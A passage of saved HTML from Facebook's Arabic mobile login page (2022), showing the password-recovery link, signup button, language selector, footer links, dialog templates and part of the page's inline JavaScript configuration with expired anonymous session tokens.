                            href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU0NzIyNjUwLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8"
                            id="forgot-password-link"
                            >هل نسيت كلمة السر؟</a
                          >
                        </div>
                      </div>
                      <div style="padding-top: 42px">
                        <div>
                          <div>
                            <div>
                              <div
                                id="login_reg_separator"
                                class="_43mg _8qtf"
                                data-sigil="login_reg_separator"
                              >
                                <span class="_43mh">أو</span>
                              </div>
                              <div class="_52jj _5t3b" id="signup_button_area">
                                <a
                                  role="button"
                                  class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                  id="signup-button"
                                  tabindex="0"
                                  data-sigil="m_reg_button"
                                  data-autoid="autoid_3"
                                  >إنشاء حساب جديد</a
                                >
                              </div>
                            </div>
                          </div>
                          <div class="_2pie" style="text-align: center">
                            <div>
                              <div
                                data-sigil="login_identify_step_element"
                              ></div>
                              <div class="other-links _8p_m">
                                <ul class="_5pkb _55wp">
                                  <li></li>
                                </ul>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div style="display: none"></div>
          <span
            ><img
              src="https://facebook.com/security/hsts-pixel.gif"
              width="0"
              height="0"
              style="display: none"
          /></span>
          <div class="_55wr _5ui2" data-sigil="m_login_footer">
            <div class="_5dpw">
              <div
                class="_5ui3"
                data-nocookies="1"
                id="locale-selector"
                data-sigil="language_selector marea"
              >
                <div class="_7om2">
                  <div class="_4g34">
                    <span class="_52jc _52j9 _52jh _3ztb">العربية</span>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Français (France)</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Español</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="/intl/save_locale/?loc=de_DE&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="/intl/save_locale/?loc=de_DE&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Deutsch</a
                        ></span
                      >
                    </div>
                  </div>
                  <div class="_4g34">
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="/intl/save_locale/?loc=en_US&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="/intl/save_locale/?loc=en_US&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >English (US)</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="/intl/save_locale/?loc=tr_TR&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="/intl/save_locale/?loc=tr_TR&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Türkçe</a
                        ></span
                      >
                    </div>
                    <div class="_3ztc">
                      <span class="_52jc"
                        ><a
                          href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-ajaxify-href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8"
                          data-method="post"
                          data-sigil="ajaxify"
                          >Português (Brasil)</a
                        ></span
                      >
                    </div>
                    <a
                      href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F%3Frtime%3D1654722648%26subno_key%3DAaFVdksd9OoHJ5n828dV4e3FJmYgnKrtZEh02wNN9Mf9A6SVraxzCxoaz9cDdX0oFPzD-Mzx6TVdXGEj1igzJz1TVxunTH8_f7KYaHNLWX8E6kt9PW03LyLySCuTjag10Qo1-9Q1n7a-TSCbck1GrGq5KbBj6QLr5CR04ZezwcFTDHAnRrgPPUNFmiJna6WkTPfuNcUH-Cyn5AQbpZP6xM45aI5cpeTnaTJ914R7B87IsGNsG1nEk5sAGKeA875uxOGc_RcqPbw4STihcRwz7AWfdLldQf_piJH19LMkBYC52w%26hrc%3D1%26refsrc%3Ddeprecated&amp;refid=8"
                      ><div
                        class="_3j87 _1rrd _3ztd"
                        aria-label="قائمة كاملة باللغات"
                        data-sigil="more_language"
                      >
                        <i class="img sp_Exhl82sHGEV sx_3108a6"></i></div
                    ></a>
                  </div>
                </div>
              </div>
              <div class="_5ui4">
                <div class="_96qv _9a0a">
                  <a
                    href="https://about.facebook.com/?refid=8"
                    class="_96qw"
                    title="اقرأ مدونتنا، واستكشف مركز الموارد، وابحث عن فرص العمل."
                    >حول</a
                  ><span aria-hidden="true"> · </span
                  ><a
                    href="/help/?ref=pf&amp;refid=8"
                    class="_96qw"
                    title="تفضل بزيارة مركز المساعدة."
                    >مساعدة</a
                  ><span aria-hidden="true"> · </span
                  ><span class="_96qw" id="u_0_5_Rq">المزيد</span>
                </div>
                <div class="_96qv" style="display: none" id="u_0_6_Ib">
                  <a
                    href="https://messenger.com/"
                    title="تفقد Messenger."
                    class="_96qw"
                    >Messenger</a
                  ><a
                    href="/lite/?refid=8"
                    title="Facebook Lite لنظام Android."
                    class="_96qw"
                    >Facebook Lite</a
                  ><a
                    href="https://m.facebook.com/watch/?refid=8"
                    title="يمكنك تصفح مقاطع الفيديو الخاصة بنا على Watch."
                    class="_96qw"
                    >Watch</a
                  ><a
                    href="/places/?refid=8"
                    title="تعرّف على الأماكن الشهيرة على فيسبوك."
                    class="_96qw"
                    >الأماكن</a
                  ><a
                    href="/games/?refid=8"
                    title="تعرّف على ألعاب فيسبوك."
                    class="_96qw"
                    >الألعاب</a
                  ><a
                    href="/marketplace/?refid=8"
                    title="يمكنك البيع والشراء من خلال Facebook Marketplace."
                    class="_96qw"
                    >Marketplace</a
                  ><a
                    href="https://pay.facebook.com/?refid=8"
                    title="تعرف على المزيد عن Facebook Pay"
                    target="_blank"
                    class="_96qw"
                    >Facebook Pay</a
                  ><a
                    href="https://www.oculus.com/"
                    title="تعرف على المزيد عن Oculus"
                    target="_blank"
                    class="_96qw"
                    >Oculus</a
                  ><a
                    href="https://portal.facebook.com/?refid=8"
                    title="تعرف على المزيد عن Facebook Portal"
                    target="_blank"
                    class="_96qw"
                    >Portal</a
                  ><a
                    href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3oevUuqOC1OeBZubD79ZyfnA1ieZDNBzVTVYPewzRUwKnog5nYV75jIAsA7bF-gtKRodwv0z5qB1G55BVWP691cIxFXcBj7A9LkeF9uwWSKFWhf6MMCSDTe8MhWiiKQNYtmmnT35oL2-2NRB0h"
                    title="تعرف على Instagram"
                    target="_blank"
                    class="_96qw"
                    rel="noopener"
                    data-sigil="MLynx_asynclazy"
                    >Instagram</a
                  ><a
                    href="https://www.bulletin.com/"
                    title="مراجعة النشرة الإخبارية على Bulletin"
                    class="_96qw"
                    >Bulletin</a
                  ><a
                    href="/local/lists/245019872666104/?refid=8"
                    title="يمكنك تصفح دليل قوائمنا المحلية."
                    class="_96qw"
                    >محلية</a
                  ><a
                    href="/fundraisers/?refid=8"
                    title="يمكنك التبرع للقضايا التي تستحق."
                    class="_96qw"
                    >حملات جمع التبرعات</a
                  ><a
                    href="/biz/directory/?refid=8"
                    title="يمكنك تصفح دليل خدمات فيسبوك."
                    class="_96qw"
                    >الخدمات</a
                  ><a
                    href="https://developers.facebook.com/?ref=pf&amp;refid=8"
                    title="قم بالتطوير في منصتنا."
                    class="_96qw"
                    >المطوّرون</a
                  ><a
                    href="/careers/?ref=pf&amp;refid=8"
                    title="حقّق النجاح في مسيرتك المهنية، انتقل إلى شركتنا الرائعة."
                    class="_96qw"
                    >الوظائف</a
                  ><a
                    href="/privacy/explanation?refid=8"
                    title="تعرف على الخصوصية وفيسبوك."
                    class="_96qw"
                    >الخصوصية</a
                  ><a
                    href="/groups/explore/?refid=8"
                    title="استكشف مجموعاتنا."
                    class="_96qw"
                    >المجموعات</a
                  >
                </div>
                <span class="mfss fcg">حقوق النشر محفوظة Meta © ‏2022‏</span>
              </div>
            </div>
          </div>
        </div>
        <div class=""></div>
        <div
          class="viewportArea _2v9s"
          style="display: none"
          id="u_0_7_zD"
          data-sigil="marea"
        >
          <div class="_5vsg" id="u_0_8_e/" style="max-height: 180px"></div>
          <div class="_5vsh" id="u_0_9_Xo" style="max-height: 370px"></div>
          <div class="_5v5d fcg">
            <div
              class="_2so _2sq _2ss img _50cg"
              data-animtype="1"
              data-sigil="m-loading-indicator-animate m-loading-indicator-root"
            ></div>
            جارٍ التحميل...
          </div>
        </div>
        <div
          class="viewportArea aclb"
          id="mErrorView"
          style="display: none"
          data-sigil="marea"
        >
          <div class="container">
            <div class="image"></div>
            <div class="message" data-sigil="error-message"></div>
            <a class="link" data-sigil="MPageError:retry">إعادة المحاولة</a>
          </div>
        </div>
      </div>
    </div>
    <div id="static_templates">
      <div
        class="mDialog"
        id="modalDialog"
        style="display: none"
        data-sigil=" context-layer-root"
        data-autoid="autoid_1"
      >
        <div
          class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled"
          id="mDialogHeader"
        >
          <div class="_7om2 _52we">
            <div class="_5s61">
              <div class="_52z7">
                <button
                  type="submit"
                  value="إلغاء"
                  class="cancelButton btn btnD bgb mfss touchable"
                  id="u_0_b_0q"
                  data-sigil="dialog-cancel-button"
                >
                  إلغاء</button
                ><button
                  type="submit"
                  value="عودة"
                  class="backButton btn btnI bgb mfss touchable iconOnly"
                  aria-label="عودة"
                  id="u_0_c_zp"
                  data-sigil="dialog-back-button"
                >
                  <i
                    class="img sp_Exhl82sHGEV sx_bf3417"
                    style="margin-top: 2px"
                  ></i>
                </button>
              </div>
            </div>
            <div class="_4g34">
              <div class="_52z6">
                <div
                  class="_50l4 mfsl fcw"
                  id="m-future-page-header-title"
                  role="heading"
                  tabindex="0"
                  data-sigil="m-dialog-header-title dialog-title"
                >
                  جارٍ التحميل...
                </div>
              </div>
            </div>
            <div class="_5s61">
              <div class="_52z8" id="modalDialogHeaderButtons"></div>
            </div>
          </div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
          <div
            class="_2so _2sq _2ss img _50cg"
            data-animtype="1"
            id="u_0_a_Df"
            data-sigil="m-loading-indicator-animate m-loading-indicator-root"
          ></div>
          جارٍ التحميل...
        </div>
      </div>
    </div>
    <script
      id="u_0_i_KW"
      crossorigin="anonymous"
      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iZfD4/yY/l/ar_AR/4U3yd2j4koQ.js?_nc_x=Ij3Wp8lg5Kz"
      data-bootloader-hash="58kqqKw"
      nonce=""
    ></script>
    <script id="u_0_j_3w" nonce="">
      requireLazy(["HasteSupportData"], function (m) {
        m.handle({
          gkxData: {
            5241: { result: true, hash: "AT7o1bCQPGpf3ShENNg" },
            5919: { result: false, hash: "AT6PGptIPUYH051B068" },
            676920: { result: false, hash: "AT497IX4gOFG8gZekag" },
            708253: { result: false, hash: "AT5n4hBL3YTMnQWtqfg" },
            996940: { result: false, hash: "AT7opYuEGy3sjG1aaBY" },
            1263340: { result: false, hash: "AT5bwizWgDaFQudmB0M" },
          },
        });
      });
      requireLazy(
        ["TimeSliceImpl", "ServerJS"],
        function (TimeSlice, ServerJS) {
          new ServerJS().handle({
            define: [
              [
                "CometPersistQueryParams",
                [],
                { relative: {}, domain: {} },
                6231,
              ],
              [
                "BigPipeExperiments",
                [],
                {
                  link_images_to_pagelets: false,
                  enable_bigpipe_plugins: false,
                },
                907,
              ],
              [
                "BootloaderConfig",
                [],
                {
                  deferBootloads: false,
                  jsRetries: [200, 500],
                  jsRetryAbortNum: 2,
                  jsRetryAbortTime: 5,
                  silentDups: false,
                  hypStep4: false,
                  phdOn: false,
                  btCutoffIndex: 627,
                },
                329,
              ],
              [
                "CSSLoaderConfig",
                [],
                {
                  timeout: 5000,
                  modulePrefix: "BLCSS:",
                  loadEventSupported: true,
                },
                619,
              ],
              ["CurrentCommunityInitialData", [], {}, 490],
              [
                "CurrentUserInitialData",
                [],
                {
                  ACCOUNT_ID: "0",
                  USER_ID: "0",
                  NAME: "",
                  SHORT_NAME: null,
                  IS_BUSINESS_PERSON_ACCOUNT: false,
                  HAS_SECONDARY_BUSINESS_PERSON: false,
                  IS_FACEBOOK_WORK_ACCOUNT: false,
                  IS_MESSENGER_ONLY_USER: false,
                  IS_DEACTIVATED_ALLOWED_ON_MESSENGER: false,
                  IS_MESSENGER_CALL_GUEST_USER: false,
                  IS_WORK_MESSENGER_CALL_GUEST_USER: false,
                  APP_ID: "412378670482",
                  IS_BUSINESS_DOMAIN: false,
                },
                270,
              ],
              ["ErrorDebugHooks", [], { SnapShotHook: null }, 185],
              ["ISB", [], {}, 330],
              ["LSD", [], { token: "AVqSTDMiPoU" }, 323],
              [
                "MRequestConfig",
                [],
                {
                  dtsg: {
                    token:
                      "NAcM5L1-iUCfqgFqyn3PrPlyoFsF8IRs6mNwJbr3hmQjgxNfyTpVw6g:0:0",
                    valid_for: 86400,
                    expire: 1654809050,
                  },
                  dtsg_ag: {
                    token:
                      "AQzkBw8UdLman4h-vSqOtikSN46paGYgnzkW-aGBe4mksjcY:0:0",
                    valid_for: 604800,
                    expire: 1655327450,
                  },
                  lsd: "AVqSTDMiPoU",
                  checkResponseOrigin: true,
                  checkResponseToken: true,
                  cleanFinishedRequest: false,
                  cleanFinishedPrefetchRequests: false,
                  ajaxResponseToken: {
                    secret: "hfjtIyOp5ATvZY-Mf4Hm7NfE58RAT5Zc",
                    encrypted:
                      "AYmY-owOHcSJYcF-hjw1WjkZBVs64lRHyrXhI1i37LmOOsQMlcsU3fhEbX32rmXOQR9qaTn2D55Az2KaVukbxkEmrWhQl-d4POgungQ-Xc1jeg",
                  },
                },
                51,
              ],
              [
                "ServerNonce",
                [],
                { ServerNonce: "NwQVRjLe4DxFZV1JW0E_l5" },
                141,
              ],
              [
                "SiteData",
                [],
                {
                  server_revision: 1005650017,
                  client_revision: 1005650017,
                  tier: "",
                  push_phase: "C3",
                  pkg_cohort: "BP:mtouch_pkg",
                  haste_session: "19151.BP:mtouch_pkg.2.0.0.0.",
                  pr: 1,
                  haste_site: "mobile",
                  manifest_base_uri: "https:\/\/z-m-static.xx.fbcdn.net",
                  manifest_origin: null,
                  be_one_ahead: false,
                  is_rtl: true,
                  is_comet: false,
                  is_experimental_tier: false,
                  is_jit_warmed_up: true,
                  hsi: "7106979666827724507-0",
                  semr_host_bucket: "5",
                  bl_hash_version: 2,
                  skip_rd_bl: true,
                  comet_env: 0,
                  wbloks_env: false,
                  spin: 0,
                  __spin_r: 1005650017,
                  __spin_b: "trunk",
                  __spin_t: 1654722650,
                  vip: "157.240.195.35",
                },
                317,
              ],
              [
                "SprinkleConfig",
                [],
                { param_name: "jazoest", version: 2, should_randomize: false },
                2111,
              ],
              [
                "PromiseUsePolyfillSetImmediateGK",
                [],
                { www_always_use_polyfill_setimmediate: false },
                2190,
              ],
              [
                "KSConfig",
                [],
                {
                  killed: {
                    __set: [
                      "MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
                      "MLHUB_FLOW_AUTOREFRESH_SEARCH",
                      "NEKO_DISABLE_CREATE_FOR_SAP",
                      "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                      "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                      "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                      "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                      "BUY_AT_UI_LINE_DELETE",
                      "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                      "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                      "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                      "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
                      "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG",
                      "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME",
                      "ADS_STORE_VISITS_METRICS_DEPRECATION",
                      "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER",
                      "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION",
                      "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS",
                      "LAB_NET_NEW_UI_RELEASE",
                      "POCKET_MONSTERS_CREATE",
                      "POCKET_MONSTERS_DELETE",
                      "SRT_BANZAI_SRT_CORE_LOGGER",
                      "SRT_BANZAI_SRT_MAIN_LOGGER",
                      "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES",
                      "POCKET_MONSTERS_UPDATE_NAME",
                      "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE",
                      "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER",
                      "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD",
                      "BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX",
                    ],
                  },
                  ko: {
                    __set: [
                      "8H4bQmEiuLT",
                      "3OsLvnSHNTt",
                      "1G7wJ6bJt9K",
                      "9NpkGYwzrPG",
                      "3oh5Mw86USj",
                      "8NAceEy9JZo",
                      "7FOIzos6XJX",
                      "rf8JEPGgOi",
                      "4j36SVzvP3w",
                      "4NSq3ZC4ScE",
                      "53gCxKq281G",
                      "3yzzwBY7Npj",
                      "1onzIv0jH6H",
                      "8PlKuowafe8",
                      "1ntjZ2zgf03",
                      "4SIH2GRVX5W",
                      "2dhqRnqXGLQ",
                      "2WgiNOrHVuC",
                      "amKHb4Cw4WI",
                      "5mNEXob0nTj",
                      "8rDvN9vWdAK",
                      "5BdzWGmfvrA",
                      "DDZhogI19W",
                      "acrJTh9WGdp",
                      "1oOE64fL4wO",
                      "9Gd8qgRxn8z",
                      "MPMaqnqZ9c",
                      "5XCz1h9Iaw3",
                      "7r6mSP7ofr2",
                      "6DGPLrRdyts",
                      "aWxCyi1sEC7",
                      "9kCSDzzr8fu",
                      "awYA7fn2Bse",
                    ],
                  },
                },
                2580,
              ],
              [
                "JSErrorLoggingConfig",
                [],
                {
                  appId: 412378670482,
                  extra: [],
                  reportInterval: 50,
                  sampleWeight: 1,
                  sampleWeightKey: "__jssesw",
                  projectBlocklist: [],
                },
                2776,
              ],
              [
                "ImmediateImplementationExperiments",
                [],
                { prefer_message_channel: true },
                3419,
              ],
              [
                "UriNeedRawQuerySVConfig",
                [],
                {
                  uris: [
                    "dms.netmng.com",
                    "doubleclick.net",
                    "r.msn.com",
                    "watchit.sky.com",
                    "graphite.instagram.com",
                    "www.kfc.co.th",
                    "learn.pantheon.io",
                    "www.landmarkshops.in",
                    "www.ncl.com",
                    "s0.wp.com",
                    "www.tatacliq.com",
                    "bs.serving-sys.com",
                    "kohls.com",
                    "lazada.co.th",
                    "xg4ken.com",
                    "technopark.ru",
                    "officedepot.com.mx",
                    "bestbuy.com.mx",
                    "booking.com",
                    "nibio.no",
                  ],
                },
                3871,
              ],
              ["RunGatingConfig", [], { shouldUseBrowserUnload: true }, 3914],
              [
                "InitialCookieConsent",
                [],
                {
                  deferCookies: false,
                  initialConsent: { __set: [1, 2] },
                  noCookies: false,
